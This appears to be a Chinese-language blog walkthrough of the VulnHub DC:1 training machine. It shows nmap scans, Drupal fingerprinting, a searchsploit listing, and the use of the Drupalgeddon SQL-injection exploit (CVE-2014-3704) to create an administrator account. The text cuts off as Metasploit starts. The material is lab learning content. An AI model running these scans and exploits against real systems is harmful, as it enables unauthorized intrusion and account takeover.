<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  DC:1 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  DC:1</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-27T08:38:24.546Z" id="date"> 2023-05-27</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-27T09:18:14.701Z" id="updated"> 2023-05-27</time></div></span><br><span>Word Count: <div class="control">2.9k</div></span><br><span>Read Time: <div class="control">16 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/chenchen.jpg'><img src="/pic/chenchen.jpg" alt="陈陈"></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>vulnhub上DC系列第一台靶机。比较简单。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>主机发现，端口扫描，TCP扫描，服务识别，系统探测，脚本漏扫</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ sudo nmap -sn 192.168.56.0/24                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00053s latency).<br>MAC Address: 0A:00:27:00:00:08 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.100<br>Host is up (0.000092s latency).<br>MAC Address: 08:00:27:2E:A1:5A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.109<br>Host is up (0.00057s latency).<br>MAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.31 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.109<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:20 CST<br>Warning: 192.168.56.109 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.109<br>Host is up (0.00030s latency).<br>Not shown: 40138 filtered tcp ports (no-response), 25393 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>49001/tcp open  nusrp<br>MAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 116.03 seconds<br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,111,49001 192.168.56.109<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.109<br>Host is up (0.00088s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 c4d659e6774c227a961660678b42488f (DSA)<br>|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)<br>|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)<br>80/tcp    open  http    Apache httpd 2.2.22 ((Debian))<br>|_http-title: Welcome to Drupal Site | Drupal Site<br>|_http-server-header: Apache/2.2.22 (Debian)<br>|_http-generator: Drupal 7 (http://drupal.org)<br>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>111/tcp   open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          37080/udp   status<br>|   100024  1          47634/udp6  status<br>|   100024  1          49001/tcp   status<br>|_  100024  1          53648/tcp6  status<br>49001/tcp open  status  1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X<br>OS CPE: cpe:/o:linux:linux_kernel:3<br>OS details: Linux 3.2 - 3.16<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.95 seconds<br>          <br>          <br>┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ sudo nmap --script=vuln 192.168.56.109                   <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:23 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.109<br>Host is up (0.00032s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>| http-enum: <br>|   /rss.xml: RSS or Atom feed<br>|   /robots.txt: Robots file<br>|   /UPGRADE.txt: Drupal file<br>|   /INSTALL.txt: Drupal file<br>|   /INSTALL.mysql.txt: Drupal file<br>|   /INSTALL.pgsql.txt: Drupal file<br>|   /: Drupal version 7 <br>|   /README: Interesting, a readme.<br>|   /README.txt: Interesting, a readme.<br>|   /0/: Potentially interesting folder<br>|_  /user/: Potentially interesting folder<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.109<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.109:80/<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /node?destination=node<br>|     <br>|     Path: http://192.168.56.109:80/user/password<br>|     Form <span class="hljs-built_in">id</span>: user-pass<br>|     Form action: /user/password<br>|     <br>|     Path: http://192.168.56.109:80/user/register<br>|     Form <span class="hljs-built_in">id</span>: user-register-form<br>|     Form action: /user/register<br>|     <br>|     Path: http://192.168.56.109:80/node?destination=node<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /node?destination=node<br>|     <br>|     Path: http://192.168.56.109:80/user<br>|     Form <span class="hljs-built_in">id</span>: user-login<br>|     Form action: /user<br>|     <br>|     Path: http://192.168.56.109:80/user/<br>|     Form <span class="hljs-built_in">id</span>: user-login<br>|_    Form action: /user/<br>| http-vuln-cve2014-3704: <br>|   VULNERABLE:<br>|   Drupal - pre Auth SQL Injection Vulnerability<br>|     State: VULNERABLE (Exploitable)<br>|     IDs:  CVE:CVE-2014-3704<br>|         The expandArguments <span class="hljs-keyword">function</span> <span class="hljs-keyword">in</span> the database abstraction API <span class="hljs-keyword">in</span><br>|         Drupal core 7.x before 7.32 does not properly construct prepared<br>|         statements, <span class="hljs-built_in">which</span> allows remote attackers to conduct SQL injection<br>|         attacks via an array containing crafted keys.<br>|           <br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-15<br>|     References:<br>|       http://www.securityfocus.com/bid/70595<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704<br>|       https://www.drupal.org/SA-CORE-2014-005<br>|_      https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>111/tcp open  rpcbind<br>MAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 356.20 seconds<br></code></pre></td></tr></table></figure>

<p>可以发现80端口爆大米了，一堆信息，甚至还爆了CVE-2014-3704的漏洞。该挑谁先下手不用多说了。</p>
<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><p>总所周知，在下手之前得先踩点。先识别下网站的技术栈。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ sudo whatweb http://192.168.56.109<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>http://192.168.56.109 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.56.109], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[php,text/javascript], Title[Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]<br></code></pre></td></tr></table></figure>

<p>发现网站是基于Drupal 7的CMS搭建的。结合之前编号CVE-2014-3704的漏洞，我们打算利用这个CMS的漏洞。</p>
<p>在操作之前，不忘在后台挂个网站目录发现，说不定有啥好东西。（实际上确实可以扫出很多目录和文件，虽然不一定对我们有用）</p>
<p>搜一下公开的漏洞：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ searchsploit Drupal                   <br>----------------------------------------------------------- ---------------------------------<br> Exploit Title                                             |  Path<br>----------------------------------------------------------- ---------------------------------<br>Drupal 4.0 - News Message HTML Injection                   | php/webapps/21863.txt<br>Drupal 4.1/4.2 - Cross-Site Scripting                      | php/webapps/22940.txt<br>Drupal 4.5.3 &lt; 4.6.1 - Comments PHP Injection              | php/webapps/1088.pl<br>Drupal 4.7 - <span class="hljs-string">&#x27;Attachment mod_mime&#x27;</span> Remote Command Executio | php/webapps/1821.php<br>Drupal 4.x - URL-Encoded Input HTML Injection              | php/webapps/27020.txt<br>Drupal 5.2 - PHP Zend Hash ation Vector                    | php/webapps/4510.txt<br>Drupal 5.21/6.16 - Denial of Service                       | php/dos/10826.sh<br>Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vul | php/webapps/11060.txt<br>Drupal 7.0 &lt; 7.31 - <span class="hljs-string">&#x27;Drupalgeddon&#x27;</span> SQL Injection (Add Admi | php/webapps/34992.py<br>Drupal 7.0 &lt; 7.31 - <span class="hljs-string">&#x27;Drupalgeddon&#x27;</span> SQL Injection (Admin Se | php/webapps/44355.php<br>Drupal 7.0 &lt; 7.31 - <span class="hljs-string">&#x27;Drupalgeddon&#x27;</span> SQL Injection (PoC) (Re | php/webapps/34984.py<br>Drupal 7.0 &lt; 7.31 - <span class="hljs-string">&#x27;Drupalgeddon&#x27;</span> SQL Injection (PoC) (Re | php/webapps/34993.php<br>Drupal 7.0 &lt; 7.31 - <span class="hljs-string">&#x27;Drupalgeddon&#x27;</span> SQL Injection (Remote C | php/webapps/35150.php<br>Drupal 7.12 - Multiple Vulnerabilities                     | php/webapps/18564.txt<br>Drupal 7.x Module Services - Remote Code Execution         | php/webapps/41564.php<br>Drupal &lt; 4.7.6 - Post Comments Remote Command Execution    | php/webapps/3313.pl<br>Drupal &lt; 5.1 - Post Comments Remote Command Execution      | php/webapps/3312.pl<br>Drupal &lt; 5.22/6.16 - Multiple Vulnerabilities              | php/webapps/33706.txt<br>Drupal &lt; 7.34 - Denial of Service                          | php/dos/35415.txt<br>Drupal &lt; 7.58 - <span class="hljs-string">&#x27;Drupalgeddon3&#x27;</span> (Authenticated) Remote Cod | php/webapps/44542.txt<br>Drupal &lt; 7.58 - <span class="hljs-string">&#x27;Drupalgeddon3&#x27;</span> (Authenticated) Remote Cod | php/webapps/44557.rb<br>Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="hljs-string">&#x27;Drupalgeddo | php/webapps/44449.rb</span><br><span class="hljs-string">Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#x27;</span>Drupalgeddon2<span class="hljs-string">&#x27; Remot | php/remote/44482.rb</span><br><span class="hljs-string">Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#x27;</span>Drupalgeddon2<span class="hljs-string">&#x27; Remot | php/webapps/44448.py</span><br><span class="hljs-string">Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserial | php/remote/46510.rb</span><br><span class="hljs-string">Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execu | php/webapps/46452.txt</span><br><span class="hljs-string">Drupal &lt; 8.6.9 - REST Module Remote Code Execution         | php/webapps/46459.py</span><br><span class="hljs-string">Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Dis | php/webapps/44501.txt</span><br><span class="hljs-string">Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripti | php/webapps/50841.txt</span><br><span class="hljs-string">Drupal Module Ajax Checklist 5.x-1.0 - Multiple SQL Inject | php/webapps/32415.txt</span><br><span class="hljs-string">Drupal Module CAPTCHA - Security Bypass                    | php/webapps/35335.html</span><br><span class="hljs-string">Drupal Module CKEditor 3.0 &lt; 3.6.2 - Persistent EventHandl | php/webapps/18389.txt</span><br><span class="hljs-string">Drupal Module CKEditor &lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Per | php/webapps/25493.txt</span><br><span class="hljs-string">Drupal Module CODER 2.5 - Remote Command Execution (Metasp | php/webapps/40149.rb</span><br><span class="hljs-string">Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execut | php/remote/40144.php</span><br><span class="hljs-string">Drupal Module Cumulus 5.x-1.1/6.x-1.4 - &#x27;</span>tagcloud<span class="hljs-string">&#x27; Cross-S | php/webapps/35397.txt</span><br><span class="hljs-string">Drupal Module Drag &amp; Drop Gallery 6.x-1.5 - &#x27;</span>upload.php<span class="hljs-string">&#x27; A | php/webapps/37453.php</span><br><span class="hljs-string">Drupal Module Embedded Media Field/Media 6.x : Video Flots | php/webapps/35072.txt</span><br><span class="hljs-string">Drupal Module MiniorangeSAML 8.x-2.22 - Privilege escalati | php/webapps/50361.txt</span><br><span class="hljs-string">Drupal Module RESTWS 7.x - PHP Remote Code Execution (Meta | php/remote/40130.rb</span><br><span class="hljs-string">Drupal Module Sections - Cross-Site Scripting              | php/webapps/10485.txt</span><br><span class="hljs-string">Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection    | php/webapps/33410.txt</span><br><span class="hljs-string">----------------------------------------------------------- ---------------------------------</span><br><span class="hljs-string">Shellcodes: No Results</span><br></code></pre></td></tr></table></figure>

<p>其中34992.py写着Add admin，对我们挺有吸引力的。试下怎么样。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ python2 34992.py -t http://192.168.56.109 -u <span class="hljs-built_in">test</span> -p <span class="hljs-built_in">test</span><br><br>  ______                          __     _______  _______ _____<br> |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |<br> |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |<br> |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |<br> |:  1    /          |__|                 |   |  |:  1   | |:  |<br> |::.. . /                                |   |  |::.. . | |::.|<br> `------<span class="hljs-string">&#x27;                                 `---&#x27;</span>  `-------<span class="hljs-string">&#x27; `---&#x27;</span><br>  _______       __     ___       __            __   __<br> |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.<br> |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |<br> |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|<br> |:  1   |  |__|      |:  |    |___|<br> |::.. . |            |::.|<br> `-------<span class="hljs-string">&#x27;            `---&#x27;</span><br><br>                                 Drup4l =&gt; 7.0 &lt;= 7.31 Sql-1nj3ct10n<br>                                              Admin 4cc0unt cr3at0r<br><br>                          Discovered by:<br><br>                          Stefan  Horst<br>                         (CVE-2014-3704)<br><br>                           Written by:<br><br>                         Claudio Viviani<br><br>                      http://www.homelab.it<br><br>                         info@homelab.it<br>                     homelabit@protonmail.ch<br><br>                 https://www.facebook.com/homelabit<br>                   https://twitter.com/homelabit<br>                 https://plus.google.com/+HomelabIt1/<br>       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww<br><br><br>[!] VULNERABLE!<br><br>[!] Administrator user created!<br><br>[*] Login: <span class="hljs-built_in">test</span><br>[*] Pass: <span class="hljs-built_in">test</span><br>[*] Url: http://192.168.56.109/?q=node&amp;destination=node<br></code></pre></td></tr></table></figure>

<p>发现成功添加并可以成功以管理员身份登录。</p>
<p class='item-img' data-src='/pic/assets/drupal-backend.png'><img src="/pic/assets/drupal-backend.png" alt="drupal-backend"></p>
<p>可惜在后台研究了半天，在content区域无论是添加php代码还是上传php文件都会要么被注释掉，要么被重名名。没有什么可以利用的点。</p>
<p>在网上查找资料，发现有<a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/40347679">大佬</a>说可以在module区域打开php filter模块就可以在block里面嵌入php代码了。</p>
<p>遂尝试，可是block区块还是只有Full HTML、Filtered HTML以及Plain text三个选项可选，嵌入php代码还是无法执行。只能暂时放弃这条路了。</p>
<p>那就看看还有什么别的漏洞能用呗。毕竟之前发现这么多exp。翻找了一下有很多远程命令执行的exp。下了一些直接利用没成，发现还有一些msf上的exp，那我们就试试msf吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]<br>└─$ sudo msfconsole                                      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>                                                  <br>                          <span class="hljs-comment">########                  #</span><br>                      <span class="hljs-comment">#################            #</span><br>                   <span class="hljs-comment">######################         #</span><br>                  <span class="hljs-comment">#########################      #</span><br>                <span 